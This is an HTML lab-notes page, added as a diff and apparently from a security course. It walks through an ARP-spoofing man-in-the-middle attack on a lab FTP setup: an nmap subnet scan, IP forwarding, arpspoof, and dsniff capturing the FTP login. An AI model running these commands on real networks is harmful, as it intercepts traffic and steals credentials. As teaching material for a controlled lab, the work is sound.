@@ -1,0 +1,16 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Day6</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+  
+    <script type="text/javascript">
+        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
+        if (!in_frame()) {
+            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
+            window.location = 'index.html#' + page;
+        }
+    </script>
+</head>
+<body><div class="page"><h1 class="title">Day6</h1><br/><strong>Objective</strong><br /><strong>Man In the middle attack</strong><br />    <br />   <br />   <img src="images/10-1.png" alt="images/10-1.png" /><br />   <br />   <strong>Steps</strong> <br />   <br />   Open 2 windows and 1 kali.<br />    <br />   Setup FTP server in PC1<br />    <strong>Follow</strong>:<a href="https://www.youtube.com/watch?v=ke3tnd73aUI">https://www.youtube.com/watch?v=ke3tnd73aUI</a><br />    Once check ftp working or not on PC2<br />    <br />    Open kali and do nmap<br />    nmap -Pn -sS -F 192.168.43.*<br />    <br />    Identifying Victim<br />    <img src="images/10-2.png" alt="images/10-2.png" /><br />    <br />    In kali install dsniff<br />    #<span style="background-color:#cecece;">apt install dsniff</span><br />    #<span style="background-color:#cecece;">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br />    #<span style="background-color:#cecece;">sysctl -w net.ipv4.ip_forward=1</span><br />    #<span style="background-color:#cecece;">arpspoof -i eth0 -t &lt;ftp IP(PC1)&gt; -r &lt;clientIP(PC2)&gt;</span><br />    And the attach started<br />    <img src="images/10-3.png" alt="images/10-3.png" /><br /><br />    In new terminal<br />    #<span style="background-color:#cecece;">dsniff -i eth0</span><br />    <br />    Now try logging in ftp from PC2<br />    <img src="images/10-4.png" alt="images/10-4.png" /><br />    After we quit we find in our kali dsniffer windows<br />    <br />    <img src="images/10-5.png" alt="images/10-5.png" /><br />    <br /><br /><strong>Terms<br />    </strong>FTP Servers: FTP servers are used to setup a server where others can upload or download the files<br />        <br />    <br /><strong>Commands</strong><br />    Windows<br />        arp - a           //to see ARP(address resolution protocol) table<br />    <br /></div></body></html>
